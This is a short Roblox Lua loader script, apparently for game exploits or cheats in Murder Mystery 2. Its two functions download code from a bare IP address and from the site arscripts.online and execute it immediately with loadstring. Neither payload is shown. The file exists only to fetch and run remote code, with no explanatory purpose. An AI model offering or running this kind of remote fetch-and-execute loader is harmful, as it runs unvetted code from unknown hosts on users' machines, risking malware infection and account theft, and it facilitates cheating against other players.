local function ScriptLoader() 
    loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjRjYmRjMDgzLWMwNzQtNDQ1Yi04MTIwLTYyZmJlM2ZmMmU5YiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
end 
local function nsUILoader() 
    loadstring(game:HttpGet("https://arscripts.online/MM2/nsNotify.lua"))()
end 
task.spawn(ScriptLoader)
task.wait(2)
task.spawn(nsUILoader)



